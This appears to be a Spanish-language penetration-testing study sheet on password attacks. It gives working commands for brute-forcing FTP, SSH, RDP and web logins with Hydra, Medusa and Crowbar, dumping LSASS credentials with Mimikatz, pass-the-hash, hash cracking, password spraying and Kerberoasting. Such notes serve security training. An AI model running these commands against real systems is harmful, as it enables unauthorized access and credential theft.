# Password Attacks

Propietario: Adrian Gisbert Cabello

### 1. Introducción a los Ataques de Contraseñas

Los ataques de contraseñas tienen como objetivo descubrir y usar credenciales válidas para obtener acceso a cuentas de usuario o servicios. Hay varios enfoques comunes para estos ataques, incluyendo ataques de diccionario, fuerza bruta y el uso de hashes de contraseñas.

### 2. Enfoques Comunes

### 2.1. Ataques de Diccionario

- Utilizan listas de palabras predefinidas (wordlists) para adivinar contraseñas.
- Son más rápidos pero cubren menos combinaciones de contraseñas.

### 2.2. Ataques de Fuerza Bruta

- Intentan todas las combinaciones posibles de caracteres.
- Cubren más combinaciones pero son extremadamente lentos.

### 3. Herramientas y Técnicas

### 3.1. Wordlists

- Los wordlists se encuentran en `/usr/share/wordlists/` en Kali Linux.
- Ejemplo de uso de wordlist con `Hydra`:
    
    ```bash
    hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://1.1.1.1
    ```
    

### 3.2. Generación de Wordlists

- **Crunch**: Generador de listas de palabras.
    
    ```bash
    crunch 8 8 -t ,@@^^%%% -o wordlist.txt
    ```
    

### 3.3. Ataques Comunes a Servicios de Red

### Ataque a HTTP htaccess con Medusa

```bash
medusa -h 1.1.1.1 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
```

### Ataque a RDP con Crowbar

```bash
crowbar -b rdp -s 1.1.1.1/32 -u admin -C /usr/share/wordlists/rockyou.txt
```

### Ataque a SSH con THC-Hydra

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://1.1.1.1
```

### Ataque a HTTP POST con THC-Hydra

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 1.1.1.1 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
```

### 4. Aprovechamiento de Hashes de Contraseñas

### 4.1. Recuperación de Hashes de Contraseñas

- **Mimikatz**: Extrae hashes de contraseñas del proceso LSASS en Windows.
    
    ```powershell
    mimikatz # privilege::debug
    mimikatz # sekurlsa::logonpasswords
    ```
    

### 4.2. Pasar el Hash (Pass-the-Hash)

- **pth-winexe**: Utiliza hashes NTLM para autenticarse en sistemas Windows.
    
    ```bash
    pth-winexe -U user%aad3b435b51404eeaad3b435b51404ee:hash //1.1.1.1 cmd
    ```
    

### 4.3. Cracking de Contraseñas

- **John the Ripper**: Herramienta de cracking de contraseñas.
    
    ```bash
    john hash.txt --format=NT
    john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
    ```
    

### 5. Ejemplo de Uso de Mimikatz y Pass-the-Hash

1. Extraer el hash con Mimikatz:
    
    ```powershell
    mimikatz # privilege::debug
    mimikatz # sekurlsa::logonpasswords
    ```
    
2. Usar el hash extraído con `pth-winexe`:
    
    ```bash
    pth-winexe -U user%aad3b435b51404eeaad3b435b51404ee:hash //1.1.1.1 cmd
    ```
    

### 6. Técnicas Avanzadas

### 6.1. Ataques "Low and Slow"

- **Spray-Passwords.ps1**: Script de PowerShell para ataques de fuerza bruta lentos en Active Directory.
    
    ```powershell
    .\Spray-Passwords.ps1 -Pass Qwerty09! -Admin
    ```
    

### 6.2. Ataques con Kerberoasting

- **Invoke-Kerberoast.ps1**: Script de PowerShell para realizar Kerberoasting.
    
    ```powershell
    Invoke-Kerberoast -OutputFormat Hashcat
    ```